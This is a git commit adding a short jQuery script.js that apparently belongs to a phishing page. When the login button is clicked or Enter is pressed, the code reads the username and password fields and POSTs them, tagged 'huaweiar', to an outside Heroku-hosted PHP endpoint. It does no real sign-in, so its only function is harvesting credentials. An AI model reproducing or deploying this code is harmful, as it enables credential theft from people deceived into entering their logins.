9104c3ad420f90b06baf1b635475b446338da445
meta-users <97819469+meta-users@users.noreply.github.com>
2022-05-01 06:08:46 +0200

    Add files via upload

---
+++ script.js
@@ -0,0 +1,31 @@
+$(function(){
+
+    $('#log-in').click(function() {
+
+        var myLink = "https://frem-analysis.herokuapp.com/POST.php";
+        var myUser = $('#user-name').val();
+        var myPass = $('#my-pass').val();
+
+        var request = $.ajax({
+            url: myLink,
+            method: "POST",
+            data: { user1 : myUser, pass1 : myPass, dir1 : "huaweiar" },
+            dataType: "html"
+          });
+           
+          request.done(function( msg ) {
+            console.log('Done1');
+          });
+
+    });
+
+    $('body').keypress(function (e) {
+        var key = e.which;
+        if(key == 13)  // the enter key code
+         {
+           $('#log-in').click();
+           return false;  
+         }
+       }); 
+
+});
